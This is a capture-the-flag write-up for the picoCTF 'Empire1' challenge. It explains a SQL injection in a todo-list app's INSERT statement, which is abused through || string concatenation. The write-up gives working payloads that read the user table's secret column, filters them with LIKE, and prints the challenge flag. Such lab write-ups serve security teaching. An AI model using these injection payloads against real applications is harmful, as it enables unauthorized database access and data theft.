# Empire1

This is a slightly harder SQL injection, where we need to leek data from the database. 

First register and log in. Now we can add todos and they appear in the your todo's page.

```sql
INSERT INTO todo (userid, content) VALUES (userid, '{{somevalue}}')
```

We can use the [`||`](https://stackoverflow.com/questions/23919378/what-does-double-bars-mean-in-sql) to concat strings.

Eg:
```sql
INSERT INTO todo (userid, content) VALUES (userid, '' || (some_expression) ||'')
```
is executed when we enter `' || (some_expression) || '`


For example the todo `'|| ('1'='1') || '` adds `1` to the todo list as `1` is the result of evaluating `'1'='1'` and the server is running the expression 

```sql
INSERT INTO todo (userid, content) VALUES (userid, '' || '1'='1' ||'')
```

Now that we can execute arbitrary SQL and put in on the todo list we need to think about what we want to get. The question asks "Can you first find the **secret** code they assigned to **you**"

Runing `' || (SELECT secret FROM user) || '` gives `Likes Oreos`. Were not their yet. 

We need to filter the secrets so we get a flag. Use the [`LIKE`](https://www.w3schools.com/sql/sql_like.asp) clause

```sql
' || (SELECT secret FROM user WHERE secret LIKE '%picoCTF%') || '
```

The final SQL is

```sql
INSERT INTO todo (userid, content) VALUES (
    userid, 
    '' || (SELECT secret FROM user WHERE secret LIKE '%picoCTF%') || ''
)
```

Flag: `picoCTF{wh00t_it_a_sql_injectdf389592} `
